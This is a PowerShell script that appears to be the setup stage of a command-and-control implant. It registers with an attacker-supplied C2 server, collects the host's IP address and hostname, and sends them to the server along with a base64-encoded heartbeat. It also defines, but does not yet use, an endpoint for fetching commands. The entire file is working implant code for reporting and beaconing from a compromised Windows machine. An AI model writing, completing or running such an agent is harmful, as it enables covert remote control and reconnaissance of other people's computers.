######
# Powershell C2 agent
######

#######################
###### CONFIGURATION
#######################

#IP address or domain of C2 server
param(
  [parameter(Mandatory=$true)]
  [string]$C2server
)
if ($C2server -eq $null) {
    Write-Error "Error: Parameter 'C2server' is required. Use IP<:port> or DOMAIN<:port>"
    return
} 

# List of URLs agent can access
$baseURL = "http://"+$C2server+"/agent"
$registerURL = $baseURL + "/register"
$updateURL = $baseURL + "/update"
$heartbeatURL = $baseURL + "/heartbeat"
$getcommandURL = $baseURL + "/getcommand"
$verifyURL = $baseURL + "/verify"

# Basic agent info
$agentID = 0
$agentIP = ""
$agentHostname = ""
$agentSleeptime = 5

#######################
###### FIRST SETUP
#######################

###### 0. Check connection to C2 server

$response = Invoke-WebRequest -Uri $heartbeatURL -UseBasicParsing -TimeoutSec 5
$statusCode = $response.StatusCode

if ($statusCode -eq 200) {
    Write-Host "[.] C2 server response is OK (status code 200)"
} else {
    Write-Host "[X] ERROR C2 server is not OK - check connectivity"
}

###### 1. Register agent

$response = Invoke-WebRequest -Uri $registerURL -UseBasicParsing
$responseContent = $response.Content

# Use a regular expression to match the ID number in the response
$regexID = "\d+"
$matches = [regex]::matches($responseContent, $regexID)

# Extract the matched number and print it
if ($matches.Count -gt 0) {
    $agentID = $matches[0].Value
    Write-Host "[.] Agent registered with ID: $agentID"
} else {
    Write-Host "[X] ERROR No ID found in the response: " + $responseContent
}

###### 2. Get basic info about host

# Get local IP address
$agentIP = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled = 'True'").IPAddress[0]

# Get local hostname
$agentHostname = (Get-WmiObject -Class Win32_ComputerSystem).Name

# Output IP address and hostname
Write-Host "[.] Obtained IP address: $agentIP"
Write-Host "[.] Obtained Hostname: $agentHostname"

###### 3. Update host data

$updateURLwithparams = $updateURL + "?id=" + $agentID + "&ip=" + $agentIP  + "&hostname=" + $agentHostname + "&sleeptime=" + $agentSleeptime

$response = Invoke-WebRequest -Uri $updateURLwithparams -UseBasicParsing
$responseContent = $response.Content

# Extract the matched number and print it
if ($responseContent -like "Updated*") {
    $agentID = $matches[0].Value
    Write-Host "[.] Updated agent with ID: $agentID"
} else {
    Write-Host "[X] ERROR response: " + $responseContent
}


###### 4. Complete the first heartbeat

$heartbeatJSON = @"
{"id":$agentID}
"@
$EncodedheartbeatJSON = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($heartbeatJSON))

$simpleheartbeatURL = $heartbeatURL + "?heartbeat=" + $EncodedheartbeatJSON

$response = Invoke-WebRequest -Uri $simpleheartbeatURL -UseBasicParsing
$responseContent = $response.Content

# Extract the matched number and print it
if ($responseContent -like "Heartbeat registered*") {
    $agentID = $matches[0].Value
    Write-Host "[.] Completed first heartbeat with ID: $agentID"
} else {
    Write-Host "[X] ERROR response: " + $responseContent
}
Write-Host "[OK] Agent setup completed!"
